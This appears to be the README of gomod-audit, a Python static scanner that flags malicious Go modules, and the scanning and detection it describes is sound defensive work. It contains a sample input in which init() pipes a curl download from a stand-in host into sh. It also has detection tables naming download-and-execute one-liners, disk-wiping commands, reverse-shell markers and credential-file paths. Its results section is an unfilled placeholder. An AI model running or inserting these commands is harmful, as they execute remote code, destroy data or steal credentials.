# gomod-audit

**Scan Go modules for malicious code before you import, build or `go generate` them.** Zero dependencies, one file, MIT.

```bash
python3 gomod_audit.py github.com/spf13/cobra           # @latest from proxy.golang.org
python3 gomod_audit.py golang.org/x/net@v0.30.0
python3 gomod_audit.py --gomod go.mod                    # every required module
python3 gomod_audit.py --gosum go.sum                    # every module version in go.sum
python3 gomod_audit.py ./vendor/github.com/some/mod      # a local dir / .go file / module .zip
python3 gomod_audit.py --text 'func init() { exec.Command("sh","-c","curl https://x.invalid/a | sh").Run() }'
# 🔴 <text>  [CRITICAL]  score=25
#     CRITICAL Download & Execute  <text>:2
```

## Why this exists

Go has no install scripts, so it's easy to assume `go get` is safe. A Go dependency still runs
code in **your** process as soon as it's imported. Every `func init()`, and every package-level
`var x = f()`, runs before `main`, in every binary and every `go test` that imports the package.
`//go:generate` lines run on developers' and CI machines. cgo preambles compile C into your binary,
and a C `__attribute__((constructor))` runs when the binary loads.

| Tool | Answers |
| --- | --- |
| `govulncheck` | Does my code reach a **known** vulnerable symbol? |
| `sum.golang.org` / `go.sum` | Is everyone getting the **same bytes**? (That includes the same backdoor: one typosquat sat in the proxy cache for about 3 years.) |
| **`gomod-audit`** | Does this module's code **behave** like malware, and does it run at import time? |

The module zip is fetched from `proxy.golang.org` **into memory** (case-encoded `!x` paths,
`@latest` / `@v/list`) and read as text. Nothing is compiled, `go get`-ed or executed.

## What it flags

| Pattern | Severity |
| --- | --- |
| Download & execute (`curl … \| sh`, `wget -O - URL \| /bin/bash &`, `bash <(curl …)`, `iex (iwr …)`), in code, a string handed to `exec.Command(sh, "-c", …)`, a **decoded / reassembled** string, a `//go:generate` line, or a cgo preamble that calls `system()` | CRITICAL |
| **String-array reassembly** (`DmM[45] + DmM[52] + …` over a slice of 1-char strings), long fragment concatenation, `base64`/`hex`/`[]byte{…}` literals: decoded and re-scanned | payload severity |
| Shell command built from obfuscated pieces and handed to `sh -c` | HIGH (CRITICAL at import) |
| Disk wiper (`dd if=/dev/zero of=/dev/sda`, `mkfs /dev/sdX`, `os.OpenFile("/dev/sda", O_WRONLY)`, `rm -rf /`, `os.RemoveAll("/")`) | CRITICAL |
| Reverse shell / C2 loop: `net.Dial` + a reader on the connection + `sh -c <received line>` in one function, `/dev/tcp/…`, `nc -e` | CRITICAL |
| Credential-store read (`~/.ssh/id_*`, `~/.aws/credentials`, `~/.docker/config.json`, `~/.kube/config`, `.netrc`) + network in the same function, when there's also an exfil host / raw IP, **or** the function runs at import time | CRITICAL |
| Whole-environment serialisation (`json.Marshal(os.Environ())`) + network in the same function | HIGH / CRITICAL |
| Dropper: download → `chmod 0755` → exec of a computed path, in one function (CRITICAL at import; MEDIUM at runtime without a checksum; INFO with one) | CRITICAL / MEDIUM |
| C constructor in a cgo preamble or a cgo package's `.c` file that calls `system()` / `exec*()` | CRITICAL |
| Exfil hosts (webhook.site, pipedream, paste sites, tunnels, OAST, chat webhooks **with a hard-coded token**) + network | HIGH |
| Persistence writes (`.bashrc`, `authorized_keys`, LaunchAgents, cron, systemd, Run keys), wallet/Keychain theft, DNS exfil (all context-gated) | HIGH |
| Shell exec of a computed command **at import time** | HIGH → CRITICAL |
| Network I/O at import time | MEDIUM |
| Raw public-IP endpoints (import time, or next to a credential read), suspicious `#cgo` plugin flags | MEDIUM |
| Process spawn at import time; `curl`/`wget` inside `//go:generate` | LOW |

## Context model

| Where the code is | What happens |
| --- | --- |
| `func init()`, package-level `var` initialisers, and every same-package function they call (followed 4 levels deep; func literals that aren't invoked in place are excluded) | **Import time**: HIGH → CRITICAL, raw-IP / string-array MEDIUM → HIGH |
| `//go:generate` directive | scanned as a shell command |
| cgo preamble (the comment before `import "C"`) and `.c/.h` files in cgo packages | scanned as C; constructors count as load time |
| `//go:build linux` / `_darwin.go` gated file | scanned normally; the constraint is reported on the finding (the 2025 loaders shipped per-OS files) |
| `_test.go` | INFO, unless it sits in a test file's `init()` chain **and** is HIGH+ |
| `testdata/`, `_dir/`, `.dir/` (the go tool never compiles them) | INFO |
| Comments | ignored (except `//go:generate` and cgo preambles) |
| A pipe-to-shell that only appears in a string (help text, `fmt.Println`, error message) and never flows into `exec.Command` | INFO |

Capabilities that popular modules use daily go to the INFO tier (`--verbose`) and don't touch the
score: process spawning, network, env reads, credential-file references, `InsecureSkipVerify`,
`plugin.Open`.

## Measured, not guessed

MEASURED_PLACEHOLDER

**Full results: [FINDINGS.md](FINDINGS.md).**

## Usage

```bash
python3 gomod_audit.py <module>[@version] [...]
python3 gomod_audit.py --gomod go.mod | --gosum go.sum
python3 gomod_audit.py <dir|file.go|module.zip>
python3 gomod_audit.py --json ...      # machine-readable
python3 gomod_audit.py --verbose ...   # include INFO context
GOMOD_AUDIT_PROXY=https://goproxy.example python3 gomod_audit.py ...   # another GOPROXY
```

Exit code **2** if any target is HIGH or CRITICAL, so it drops straight into CI:

```yaml
- run: curl -sSLO https://raw.githubusercontent.com/eltociear/gomod-audit/main/gomod_audit.py
- run: python3 gomod_audit.py --gomod go.mod
```

Runs on Python 3.9+ with only the standard library.

Tests: `python3 -m unittest discover -s tests` (9 inert canaries modelled on real Go incidents,
10 benign controls, unit checks). Corpus run: `scripts/bulk_scan.py`.

## Limitations

- It's static and regex/heuristic based, and the lexer is "Go-lite", not a type checker. It folds
  simple constants, concatenations, index reassembly, `range`-over-index-slice loops and
  base64/hex/byte literals in one file. It does not follow values across packages, through
  struct fields, or through custom decoders (XOR loops, AES).
- Import-time reachability follows unqualified same-package calls only, not methods or interface
  dispatch.
- Only `.go` files and C sources in cgo packages are scanned. Shell scripts and Makefiles in the
  module zip aren't scanned, because nothing in `go build` runs them.
- It scans one module at a time, not your whole build graph. Use `--gosum` for that.
- A SAFE result means no rule fired. It doesn't prove the module is benign.

## Related

The same engine for other ecosystems:
- [mcp-audit](https://github.com/eltociear/mcp-audit): MCP servers and AI-agent skills
- [npm-audit](https://github.com/eltociear/npm-audit): npm packages and install scripts
- [crate-audit](https://github.com/eltociear/crate-audit): Rust crates, build scripts and proc-macros

*Findings are pattern matches that warrant human review, not verdicts. Report suspected malicious
modules to the Go security team (security@golang.org) and to the hosting provider, not as
unverified public accusations.*

MIT licensed.
